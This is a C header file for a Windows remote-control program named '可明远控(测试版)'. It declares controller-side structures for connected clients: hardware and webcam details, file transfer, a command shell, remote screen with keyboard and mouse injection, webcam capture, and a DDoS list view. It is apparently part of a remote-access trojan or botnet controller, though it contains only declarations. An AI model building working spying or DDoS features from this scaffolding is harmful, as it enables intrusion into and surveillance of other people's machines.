/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#ifndef KM_HEAD_H_INCLUDED
#define KM_HEAD_H_INCLUDED

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <shlobj.h>
#include <ctype.h>
#include "resource.h"

typedef
BOOL
(PASCAL FAR * LPFN_ACCEPTEX)(
    IN SOCKET sListenSocket,
    IN SOCKET sAcceptSocket,
    IN PVOID lpOutputBuffer,
    IN DWORD dwReceiveDataLength,
    IN DWORD dwLocalAddressLength,
    IN DWORD dwRemoteAddressLength,
    OUT LPDWORD lpdwBytesReceived,
    IN LPOVERLAPPED lpOverlapped
    );

#define WSAID_ACCEPTEX \
        {0xb5367df1,0xcbac,0x11cf,{0x95,0xca,0x00,0x80,0x5f,0x48,0xa1,0x92}}

typedef
BOOL
(PASCAL FAR * LPFN_CONNECTEX)(
    IN SOCKET s,
    IN const struct sockaddr FAR *name,
    IN int namelen,
    IN PVOID lpSendBuffer OPTIONAL,
    IN DWORD dwSendDataLength,
    OUT LPDWORD lpdwBytesSent,
    IN LPOVERLAPPED lpOverlapped
    );

#define WSAID_CONNECTEX \
    {0x25a207b9,0xddf3,0x4660,{0x8e,0xe9,0x76,0xe5,0x8c,0x74,0x06,0x3e}}

typedef
BOOL
(PASCAL FAR * LPFN_DISCONNECTEX)(
    IN SOCKET s,
    IN LPOVERLAPPED lpOverlapped,
    IN DWORD  dwFlags,
    IN DWORD  dwReserved
    );

#define WSAID_DISCONNECTEX \
    {0x7fda2e11,0x8630,0x436f,{0xa0, 0x31, 0xf5, 0x36, 0xa6, 0xee, 0xc1, 0x57}}

typedef enum _WTS_CONNECTSTATE_CLASS
{
  WTSActive,
  WTSConnected,
  WTSConnectQuery,
  WTSShadow,
  WTSDisconnected,
  WTSIdle,
  WTSListen,
  WTSReset,
  WTSDown,
  WTSInit
}WTS_CONNECTSTATE_CLASS;

typedef struct _WTS_SESSION_INFO {
    DWORD SessionId;
    LPTSTR pWinStationName;
    WTS_CONNECTSTATE_CLASS State;
} WTS_SESSION_INFO,  *PWTS_SESSION_INFO;

#define     IDR_COMBOEX             48000
#define     IDR_LISTVIEW            48001
#define     IDR_LISTVIEWFILE        48002
#define     IDR_TOOLBAR4            48003
#define     IDR_COM_RE_COUNT        48004
#define     IDR_COM_CTRLSHIFTDEL    48005
#define     IDR_COM_SENDKEY         48006
#define     IDR_COM_SENDMOUSE       48007
#define     IDR_COM_STARTSTOP       48008
#define     IDR_DDOS_LISTVIEW       48009
#define     IDR_COM_IMAGE           48010

#define SOCK_LOOP_RE_COUNT    0x0
#define SOCK_LOOP_RECV_NEXT   0x1
#define SOCK_LOOP_CLOSE       0x2
#define SOCK_LOOP_RECV_HEADER 0x3

#define TB_SETIMAGELIST (WM_USER + 48)
#define TB_SETHOTIMAGELIST	(WM_USER+52)
#define TB_SETEXTENDEDSTYLE	(WM_USER+84)
#define TBSTYLE_FLAT 2048
#define TBSTYLE_LIST 4096
#define TBSTYLE_CUSTOMERASE 8192

#define TBSTYLE_DROPDOWN	8
#define TBN_DROPDOWN	(TBN_FIRST-10)
#define TB_GETRECT	(WM_USER+51)
#define LVM_SETEXTENDEDLISTVIEWSTYLE (LVM_FIRST+54)

#define TBSTYLE_EX_DRAWDDARROWS	0x00000001
#define TBSTYLE_EX_MIXEDBUTTONS 8
#define TBSTYLE_EX_HIDECLIPPEDBUTTONS 16
#define TBSTYLE_EX_DOUBLEBUFFER	0x80

#define TBSTYLE_AUTOSIZE	16
#define TBSTYLE_NOPREFIX	32

enum io_socket_type{C_UNKNOWN=0,C_CLIENT,C_MAIN,C_UPDOWNFILE,C_ADMIN,C_CMD,C_LISTEN,C_SCREEN,C_CAP_SCREEN};    //客户端是干什么来着的
enum frame_state{F_SHOW=0,F_CLOSE};
enum file_op_type{F_UNKNOWN=0,F_UPFILE,F_DOWNFILE,F_UPDIRECTORY,F_DOWNDIRECTORY};
enum list_col_state{COL_HIDE=0,COL_SHOW=1,COL_K_SHOW=2};

#pragma pack(1)

typedef struct tag_client_module{
    unsigned char   majorcmd;
    unsigned long   crc32;
}client_module,*pclient_module;
typedef struct tag_manger_module{
    char            modulename[32];                 //模块名字
    char            moduledescriptor[128];          //描述
    unsigned long   moduletype;                     //模块类型
    unsigned long   modulelength;                   //长度
    char            *moduledata;                    //模块文件数据
    client_module   c_module;
    struct tag_manger_module *next;
}manger_module,*pmanger_module;



typedef int (*f_work)(int,DWORD,void*,LPOVERLAPPED);
typedef struct t_socket_accept{
    OVERLAPPED overlapped;
    SOCKET socket;
    char buffer[512];
    DWORD dwBytes;
}io_socket_accept,*pio_socket_accept;

typedef struct tag_io_socket{
    enum io_socket_type io_type;
    SOCKET socket;
    OVERLAPPED overlapped;
    struct sockaddr_in local_addr;
    struct sockaddr_in remote_addr;
    void *f_call_work;
    void *f_call_exit;
    void *f_temp_call_work;
    WSABUF s_buf;
    WSABUF r_buf;
    char *i_buffer;
    int i_length;
    int r_count;
    void *extend;
    struct tag_io_socket *next;
}io_socket,*pio_socket;
typedef int (*kms_sock_func)(pio_socket i_socket);

typedef struct tag_io_data_header{
    unsigned long length;
    unsigned long crc32;
    unsigned char major_cmd;
    unsigned char minor_cmd;
    unsigned char error1;
    unsigned char error2;
}io_data_header,*pio_data_header;

typedef int (*kms_event_func)(pio_socket i_socket, char *buffer, int length);
typedef struct tag_main_event_func{
    unsigned char count;
    kms_event_func *event_funcs;
}main_event_func;



typedef struct tag_client_ver{
    unsigned short wVersion;
    unsigned short wSystemVersion;
    unsigned long c_type;
}client_ver,*pclient_ver;

typedef struct tag_client_info{
    unsigned long   crc32_group;                        //crc32后的组名
    unsigned long   dwLanAddr;                          //局域网ip地址
    unsigned char   dwProcessorType;                    //cpu类型     //PROCESSOR_ARCHITECTURE_INTEL
    float           dwProcessorMhz;                     //cpu频率
    unsigned char   dwNumberOfProcessors;               //cpu数量
    float           dwMemory;                           //内存
    unsigned long   dwConnectTime;                      //连接时间
    unsigned short  wXscreen;                           //X
    unsigned short  wYscreen;                           //Y
    unsigned char   cCap;                               //是否有摄像头
    unsigned char   cReserve1;
    unsigned char   cReserve2;
    char            lpAdapterDescriptor[64];            //网卡描述
    char            lpDescriptor[32];                   //备注
}client_info,*pclient_info;

typedef struct tag_m_frame_file_control{
    HWND hWnd;
    HWND hTools;
    HWND hComboEx;
    HWND hListView;
    HWND hListFile;
    HWND hStatus;
}m_frame_file_control,*pm_frame_file_control;
typedef struct tag_m_frame_file_data{
    unsigned short drivenum;
    unsigned short netnum;
    void           *drive;
    void           *net;
    int            comboxnum;
    int            comboxcur;
}m_frame_file_data,*pm_frame_file_data;
typedef struct tag_m_frame_file{
    enum frame_state     f_state;
    m_frame_file_control m_controls;
    m_frame_file_data    m_data;
}m_frame_file,*pm_frame_file;

typedef struct tag_file_list{
    struct tag_file_list *next;
    unsigned long   attributes;
    char            filename[512];
}op_file,*p_op_file;
typedef struct tag_client_file
{
    struct tag_client_file  *next;
    enum file_op_type       f_op_type;
    pio_socket              i_socket;
    int                     index;
    HANDLE                  hFile;
    unsigned long           nFileMax;       //要传的文件总数
    unsigned long           nFileCur;       //已传的文件总数
    unsigned long           nMaxSize;
    unsigned long           nCurSize;
    char                    server_directory[1024];
    char                    client_directory[1024];
    p_op_file               h_op_file;
    p_op_file               c_op_file;
}up_down_file,*p_up_down_file;

typedef struct tag_frame_screen{
    SCROLLINFO g_sih;
    SCROLLINFO g_siv;
    SIZE       g_size;
    PWTS_SESSION_INFO psession_info;
    int session_info_count;
    HWND hWnd;
    HWND hTool;
    HWND hCombox;
    HWND hReCombox;
    HWND hCtrlShiftDel;
    HWND hSendKey;
    HWND hSendMouse;
    HWND hStartStop;
    HWND hImage;
    int isImage;
    DWORD dwMouseTime;
    POINT point;
    int hStartStop_State;
    int isSendKey;
    int isSendMouse;
    char *i_buffer;
    int i_length;
    pio_socket i_socket;
}m_frame_screen,*pm_frame_screen;

typedef struct tag_frame_cap_screen{
    char* psession_info;
    int session_info_count;
    HWND hWnd;
    HWND hTool;
    HWND hCombox;
    HWND hReCombox;
    HWND hStartStop;
    HWND hImage;
    int isImage;
    int hStartStop_State;
    char *i_buffer;
    int i_length;
    pio_socket i_socket;
}m_frame_cap_screen, *pm_frame_cap_screen;

typedef struct tag_km_client{
    client_ver      c_ver;
    client_info     c_info;
    char            ipaddr[64];
    m_frame_file    frame_file;
    m_frame_screen  frame_screen;
    m_frame_cap_screen frame_cap_screen;
}km_client,*pkm_client;


typedef struct tag_share_main{
    HANDLE h_completion_port;
    CRITICAL_SECTION critical_section;
    client_ver c_ver;
    char *km_cur_path;
    char *km_mod_path;
    char *km_cmd_exec;
    main_event_func event_funcs[0xff];
    int sock_loop_thread_count;
    HANDLE *sock_loop_thread;
}share_main,*pshare_main;

LPFN_ACCEPTEX lpfn_acceptex;

pshare_main g_share_main;
pmanger_module p_manger_client_module;
HINSTANCE hInst;

#define     KM_NAME     "可明远控(测试版)"

#pragma pack(1)

#endif
